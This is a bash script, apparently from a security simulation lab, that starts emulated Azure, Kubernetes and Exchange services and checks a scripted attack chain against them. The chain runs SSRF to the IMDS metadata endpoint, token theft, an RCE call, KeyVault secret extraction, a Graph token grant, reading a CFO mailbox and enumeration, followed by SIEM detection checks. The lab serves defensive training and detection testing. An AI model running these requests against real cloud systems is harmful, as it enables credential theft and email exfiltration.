#!/bin/bash
# run_scenario.sh - Start and verify AKS attack chain (Kubernetes + Exchange exfiltration)
#
# Usage:
#   ./run_scenario.sh           Start containers, run health checks and verification
#   ./run_scenario.sh -d        Run everything, then stop containers
#   ./run_scenario.sh -v        Verbose output (show full responses)

set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BUNDLE_DIR="$SCRIPT_DIR"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Defaults
STOP_SERVICES=false
VERBOSE=false

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -d|--down)
            STOP_SERVICES=true
            shift
            ;;
        -v|--verbose)
            VERBOSE=true
            shift
            ;;
        -h|--help)
            echo "Usage: $0 [options]"
            echo ""
            echo "Options:"
            echo "  -d, --down     Stop containers after verification"
            echo "  -v, --verbose  Show full API responses"
            echo "  -h, --help     Show this help message"
            exit 0
            ;;
        *)
            echo "Unknown option: $1"
            exit 1
            ;;
    esac
done

# Track results
PASSED=0
FAILED=0

pass() {
    echo -e "  ${GREEN}✓${NC} $1"
    PASSED=$((PASSED + 1))
}

fail() {
    echo -e "  ${RED}✗${NC} $1"
    FAILED=$((FAILED + 1))
}

warn() {
    echo -e "  ${YELLOW}!${NC} $1"
}

info() {
    echo -e "  ${BLUE}→${NC} $1"
}

# Store tokens for use across steps
MSI_TOKEN=""
EXCHANGE_CLIENT_ID=""
EXCHANGE_CLIENT_SECRET=""
GRAPH_TOKEN=""

echo "============================================================"
echo "SABER-SIM: AKS Attack Chain (K8s + Exchange Exfiltration)"
echo "============================================================"
echo ""

# =============================================================================
# STEP 1: Start Docker Compose
# =============================================================================
echo -e "${BLUE}[1/4] Starting Docker Compose${NC}"
cd "$BUNDLE_DIR"

if docker compose up -d --build 2>/dev/null; then
    pass "docker compose up -d --build"
else
    fail "docker compose up -d --build"
    exit 1
fi
echo ""

# =============================================================================
# STEP 2: Wait for Init Containers
# =============================================================================
echo -e "${BLUE}[2/4] Waiting for init containers${NC}"

TIMEOUT=180
ELAPSED=0
INTERVAL=5

while [[ $ELAPSED -lt $TIMEOUT ]]; do
    STATUS=$(docker compose ps -a init-seed 2>/dev/null | grep -iE "Exit(ed)? \(?0\)?" || true)
    if [[ -n "$STATUS" ]]; then
        pass "init-seed completed"
        break
    fi

    FAILED_STATUS=$(docker compose ps -a init-seed 2>/dev/null | grep -iE "Exit(ed)? \(?[1-9]" || true)
    if [[ -n "$FAILED_STATUS" ]]; then
        fail "init-seed failed"
        docker compose logs init-seed | tail -20
        exit 1
    fi

    sleep $INTERVAL
    ELAPSED=$((ELAPSED + INTERVAL))
    info "Waiting for seeding... ($ELAPSED/${TIMEOUT}s)"
done

if [[ $ELAPSED -ge $TIMEOUT ]]; then
    fail "init-seed timeout"
    exit 1
fi

# Verify seeding results
SEED_OUTPUT=$(docker compose logs init-seed 2>/dev/null)
if echo "$SEED_OUTPUT" | grep -q "\[OK\] Secret: exchange-sp-client-id"; then
    pass "KeyVault secret seeded (exchange-sp-client-id)"
else
    fail "KeyVault secret not seeded"
fi

if echo "$SEED_OUTPUT" | grep -q "\[OK\] Secret: exchange-sp-client-secret"; then
    pass "KeyVault secret seeded (exchange-sp-client-secret)"
else
    fail "KeyVault secret not seeded"
fi

if echo "$SEED_OUTPUT" | grep -q "\[OK\] IMDS: 1 token"; then
    pass "IMDS token seeded"
else
    fail "IMDS token not seeded"
fi

if echo "$SEED_OUTPUT" | grep -q "\[OK\] AKS Pod env"; then
    pass "AKS Pod environment seeded"
else
    fail "AKS Pod environment not seeded"
fi

if echo "$SEED_OUTPUT" | grep -q "\[OK\] K8s API tokens"; then
    pass "Kubernetes API tokens seeded"
else
    fail "Kubernetes API tokens not seeded"
fi

if echo "$SEED_OUTPUT" | grep -q "\[OK\] K8s resources"; then
    pass "Kubernetes resources seeded"
else
    fail "Kubernetes resources not seeded"
fi

if echo "$SEED_OUTPUT" | grep -q "\[OK\] Exchange.*mailbox"; then
    pass "Exchange mailbox seeded"
else
    fail "Exchange mailbox not seeded"
fi
echo ""

# =============================================================================
# STEP 3: Health Checks
# =============================================================================
echo -e "${BLUE}[3/4] Health Checks${NC}"

# Wait for services to be fully ready
info "Waiting 5s for services to stabilize..."
sleep 5

check_health() {
    local name=$1
    local url=$2
    local response
    local retries=3

    for i in $(seq 1 $retries); do
        response=$(curl -sk --max-time 5 "$url" 2>/dev/null || echo "")
        if echo "$response" | grep -qi "healthy\|status"; then
            pass "$name"
            [[ "$VERBOSE" == "true" ]] && echo "      $response"
            return 0
        fi
        [[ $i -lt $retries ]] && sleep 2
    done
    fail "$name"
    return 1
}

check_health "AKS Pod HR App (8085)" "http://localhost:8085/health"
check_health "Kubernetes API (6443)" "https://localhost:6443/healthz"
check_health "Azure AD (8081)" "http://localhost:8081/health"
check_health "KeyVault (8200)" "https://localhost:8200/health"
check_health "IMDS (8080)" "http://localhost:8080/health"
check_health "ARM API (8445)" "https://localhost:8445/health"
check_health "Functions (7071)" "http://localhost:7071/health"
check_health "Exchange Online (8443)" "https://localhost:8443/health"
check_health "Sentinel (5000)" "http://localhost:5000/health"
echo ""

# =============================================================================
# STEP 4: Attack Chain Verification
# =============================================================================
echo -e "${BLUE}[4/4] Attack Chain Verification${NC}"

# --- Step 4.1: Reconnaissance & Discovery ---
echo ""
echo "  Step 4.1: Reconnaissance & Discovery"

# 4.1.1: Fingerprint the application
RESPONSE=$(curl -s http://localhost:8085/ -D - 2>/dev/null || echo "")
if echo "$RESPONSE" | grep -qi "HR Portal\|X-Pod-Name"; then
    pass "Fingerprint: HR App detected (AKS Pod)"
    [[ "$VERBOSE" == "true" ]] && echo "$RESPONSE" | grep -i "x-pod-name\|server:" | head -2
else
    fail "Fingerprint failed"
fi

# 4.1.2: Check application status for version info
RESPONSE=$(curl -s http://localhost:8085/api/status 2>/dev/null || echo "")
if echo "$RESPONSE" | grep -q '"version"'; then
    pass "api/status reveals version and pod info"
    [[ "$VERBOSE" == "true" ]] && echo "$RESPONSE"
else
    fail "api/status check failed"
fi

# 4.1.3: Discover document preview feature (SSRF vector)
RESPONSE=$(curl -s http://localhost:8085/api/status 2>/dev/null || echo "")
if echo "$RESPONSE" | grep -q '"document_preview":true\|"external_integrations":true'; then
    pass "Document preview feature detected (SSRF vector)"
else
    warn "Document preview not explicitly listed"
fi

# --- Step 4.2: Initial Access (SSRF to IMDS) ---
echo ""
echo "  Step 4.2: Initial Access (SSRF via /api/document/preview)"
RESPONSE=$(curl -s -X POST http://localhost:8085/api/document/preview \
    -H "Content-Type: application/json" \
    -d '{"url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"}' 2>/dev/null || echo "")

if echo "$RESPONSE" | grep -q '"access_token"'; then
    MSI_TOKEN=$(echo "$RESPONSE" | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4)
    pass "SSRF exploited - Managed identity token stolen via IMDS"
    [[ "$VERBOSE" == "true" ]] && echo "      Token: ${MSI_TOKEN:0:50}..."
else
    fail "SSRF exploitation failed"
    echo "      Response: $RESPONSE"
fi

# --- Step 4.3: Post-Exploitation (RCE via /exec) ---
echo ""
echo "  Step 4.3: Post-Exploitation (RCE via /exec)"
RESPONSE=$(curl -s -X POST http://localhost:8085/exec \
    -H "Content-Type: application/json" \
    -d '{"cmd": "whoami"}' 2>/dev/null || echo "")

if echo "$RESPONSE" | grep -q '"stdout"'; then
    pass "RCE achieved - command execution available"
    [[ "$VERBOSE" == "true" ]] && echo "$RESPONSE"
else
    fail "RCE failed"
    echo "      Response: $RESPONSE"
fi

# --- Step 4.4: KeyVault Secret Retrieval (Exchange SP Credentials) ---
echo ""
echo "  Step 4.4: KeyVault Secret Retrieval (Exchange SP Credentials)"
if [[ -n "$MSI_TOKEN" ]]; then
    # Get exchange-sp-client-id
    RESPONSE=$(curl -sk "https://localhost:8200/secrets/exchange-sp-client-id" \
        -H "Authorization: Bearer $MSI_TOKEN" 2>/dev/null || echo "")

    if echo "$RESPONSE" | grep -q '"value"'; then
        EXCHANGE_CLIENT_ID=$(echo "$RESPONSE" | grep -o '"value":"[^"]*"' | cut -d'"' -f4)
        pass "Exchange SP client_id retrieved: $EXCHANGE_CLIENT_ID"
    else
        fail "KeyVault access failed (client_id)"
        echo "      Response: $RESPONSE"
    fi

    # Get exchange-sp-client-secret
    RESPONSE=$(curl -sk "https://localhost:8200/secrets/exchange-sp-client-secret" \
        -H "Authorization: Bearer $MSI_TOKEN" 2>/dev/null || echo "")

    if echo "$RESPONSE" | grep -q '"value"'; then
        EXCHANGE_CLIENT_SECRET=$(echo "$RESPONSE" | grep -o '"value":"[^"]*"' | cut -d'"' -f4)
        pass "Exchange SP client_secret retrieved: ${EXCHANGE_CLIENT_SECRET:0:8}..."
    else
        fail "KeyVault access failed (client_secret)"
        echo "      Response: $RESPONSE"
    fi
else
    fail "Skipped - no MSI token from previous step"
fi

# --- Step 4.5: Azure AD Token Acquisition (client_credentials grant) ---
echo ""
echo "  Step 4.5: Azure AD Token Acquisition (client_credentials grant)"
if [[ -n "$EXCHANGE_CLIENT_ID" && -n "$EXCHANGE_CLIENT_SECRET" ]]; then
    TENANT_ID="87654321-4321-4321-4321-cba987654321"

    RESPONSE=$(curl -s -X POST "http://localhost:8081/${TENANT_ID}/oauth2/v2.0/token" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "grant_type=client_credentials" \
        -d "client_id=${EXCHANGE_CLIENT_ID}" \
        -d "client_secret=${EXCHANGE_CLIENT_SECRET}" \
        -d "scope=https://graph.microsoft.com/.default" 2>/dev/null || echo "")

    if echo "$RESPONSE" | grep -q '"access_token"'; then
        GRAPH_TOKEN=$(echo "$RESPONSE" | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4)
        pass "Graph API token acquired via client_credentials"
        [[ "$VERBOSE" == "true" ]] && echo "      Token: ${GRAPH_TOKEN:0:50}..."
    else
        fail "Azure AD token acquisition failed"
        echo "      Response: $RESPONSE"
    fi
else
    fail "Skipped - no SP credentials from previous step"
fi

# --- Step 4.6: Exchange Email Exfiltration ---
echo ""
echo "  Step 4.6: Exchange Email Exfiltration (CFO Mailbox)"
if [[ -n "$GRAPH_TOKEN" ]]; then
    # List messages in CFO mailbox
    RESPONSE=$(curl -sk "https://localhost:8443/v1.0/users/cfo@contoso.com/messages" \
        -H "Authorization: Bearer $GRAPH_TOKEN" 2>/dev/null || echo "")

    if echo "$RESPONSE" | grep -q '"value"'; then
        MESSAGE_COUNT=$(echo "$RESPONSE" | grep -o '"id"' | wc -l)
        pass "CFO mailbox accessed - $MESSAGE_COUNT messages found"
        [[ "$VERBOSE" == "true" ]] && echo "$RESPONSE" | head -c 500

        # Check for sensitive content
        if echo "$RESPONSE" | grep -qi "financial\|confidential\|acquisition"; then
            pass "Sensitive email content detected"
        fi
    else
        fail "Exchange mailbox access failed"
        echo "      Response: $RESPONSE"
    fi

    # Get specific message
    RESPONSE=$(curl -sk "https://localhost:8443/v1.0/users/cfo@contoso.com/messages/msg-001" \
        -H "Authorization: Bearer $GRAPH_TOKEN" 2>/dev/null || echo "")

    if echo "$RESPONSE" | grep -q '"subject"'; then
        SUBJECT=$(echo "$RESPONSE" | grep -o '"subject":"[^"]*"' | cut -d'"' -f4)
        pass "Email retrieved: $SUBJECT"
        [[ "$VERBOSE" == "true" ]] && echo "$RESPONSE" | head -c 300
    else
        fail "Failed to retrieve specific email"
    fi

    # List mail folders
    RESPONSE=$(curl -sk "https://localhost:8443/v1.0/users/cfo@contoso.com/mailFolders" \
        -H "Authorization: Bearer $GRAPH_TOKEN" 2>/dev/null || echo "")

    if echo "$RESPONSE" | grep -q '"value"'; then
        pass "Mail folders enumerated"
    else
        fail "Mail folders enumeration failed"
    fi
else
    fail "Skipped - no Graph token from previous step"
fi

# --- Step 4.7: Kubernetes API Enumeration ---
echo ""
echo "  Step 4.7: Kubernetes API Enumeration"
if [[ -n "$MSI_TOKEN" ]]; then
    # List namespaces
    RESPONSE=$(curl -sk "https://localhost:6443/api/v1/namespaces" \
        -H "Authorization: Bearer $MSI_TOKEN" 2>/dev/null || echo "")
    if echo "$RESPONSE" | grep -q '"NamespaceList"\|"items"'; then
        pass "K8s: Namespaces enumerated"
        [[ "$VERBOSE" == "true" ]] && echo "$RESPONSE" | head -c 300
    else
        fail "K8s: Namespaces failed"
    fi

    # List pods in production namespace
    RESPONSE=$(curl -sk "https://localhost:6443/api/v1/namespaces/production/pods" \
        -H "Authorization: Bearer $MSI_TOKEN" 2>/dev/null || echo "")
    if echo "$RESPONSE" | grep -q '"PodList"\|"items"'; then
        pass "K8s: Pods in production namespace enumerated"
    else
        fail "K8s: Pods enumeration failed"
    fi

    # List secrets in production namespace (discovery target)
    RESPONSE=$(curl -sk "https://localhost:6443/api/v1/namespaces/production/secrets" \
        -H "Authorization: Bearer $MSI_TOKEN" 2>/dev/null || echo "")
    if echo "$RESPONSE" | grep -q '"SecretList"\|"items"'; then
        pass "K8s: Secrets discovered in production namespace"
        [[ "$VERBOSE" == "true" ]] && echo "$RESPONSE" | head -c 300
    else
        fail "K8s: Secrets discovery failed"
    fi
else
    fail "Skipped - no token"
fi

# --- Step 4.8: ARM API Enumeration ---
echo ""
echo "  Step 4.8: ARM API Enumeration"
if [[ -n "$MSI_TOKEN" ]]; then
    # Subscriptions
    RESPONSE=$(curl -sk "https://localhost:8445/subscriptions" \
        -H "Authorization: Bearer $MSI_TOKEN" 2>/dev/null || echo "")
    if echo "$RESPONSE" | grep -q '"subscriptionId"'; then
        pass "ARM: Subscriptions enumerated"
    else
        fail "ARM: Subscriptions failed"
    fi

    # Resource Groups
    RESPONSE=$(curl -sk "https://localhost:8445/subscriptions/12345678-1234-1234-1234-123456789abc/resourcegroups?api-version=2021-04-01" \
        -H "Authorization: Bearer $MSI_TOKEN" 2>/dev/null || echo "")
    if echo "$RESPONSE" | grep -q '"name"'; then
        pass "ARM: Resource groups enumerated"
    else
        fail "ARM: Resource groups failed"
    fi
else
    fail "Skipped - no token"
fi

# --- Step 4.9: Exchange Audit Logs ---
echo ""
echo "  Step 4.9: Exchange Audit Logs"
RESPONSE=$(curl -sk "https://localhost:8443/audit/logs" 2>/dev/null || echo "")
if echo "$RESPONSE" | grep -q '"MailItemsAccessed"\|"Operation"'; then
    LOG_COUNT=$(echo "$RESPONSE" | grep -o '"Operation"' | wc -l)
    pass "Exchange audit logs collected ($LOG_COUNT events)"
    [[ "$VERBOSE" == "true" ]] && echo "$RESPONSE" | head -c 500
else
    warn "Exchange audit logs not yet generated (may appear after access)"
fi

# --- Step 4.10: Azure Sentinel SIEM ---
echo ""
echo "  Step 4.10: Azure Sentinel SIEM"

# Health
RESPONSE=$(curl -s "http://localhost:5000/health" 2>/dev/null || echo "")
if echo "$RESPONSE" | grep -q '"logCount"'; then
    LOG_COUNT=$(echo "$RESPONSE" | grep -o '"logCount":[0-9]*' | cut -d':' -f2)
    pass "Sentinel: Collecting logs ($LOG_COUNT total)"
else
    fail "Sentinel: Health check failed"
fi

# KQL query
RESPONSE=$(curl -s -X POST "http://localhost:5000/query" \
    -H "Content-Type: application/json" \
    -d '{"query": "AllLogs | take 1"}' 2>/dev/null || echo "")
if echo "$RESPONSE" | grep -q '"status":"Success"'; then
    pass "Sentinel: KQL queries working"
else
    fail "Sentinel: KQL query failed"
fi

echo ""

# =============================================================================
# Cleanup (if requested)
# =============================================================================
if [[ "$STOP_SERVICES" == "true" ]]; then
    echo -e "${BLUE}Stopping containers...${NC}"
    cd "$BUNDLE_DIR"
    docker compose down
    pass "Containers stopped"
    echo ""
fi

# =============================================================================
# Summary
# =============================================================================
echo "============================================================"
TOTAL=$((PASSED + FAILED))
if [[ $FAILED -eq 0 ]]; then
    echo -e "${GREEN}All $PASSED checks passed!${NC}"
    echo "============================================================"
    echo ""
    echo "Attack chain verified:"
    echo "  1. Initial Access    → SSRF in AKS HR App Pod"
    echo "  2. Credential Access → IMDS token theft"
    echo "  3. Discovery         → Kubernetes API enumeration"
    echo "  4. KeyVault Access   → Extract Exchange SP credentials"
    echo "  5. Azure AD          → client_credentials token for Graph API"
    echo "  6. Exfiltration      → Exchange 365 CFO mailbox"
    echo "  7. Detection         → Sentinel SIEM + Exchange/K8s audit logs"
    echo ""
    exit 0
else
    echo -e "${RED}$FAILED of $TOTAL checks failed${NC}"
    echo "============================================================"
    exit 1
fi
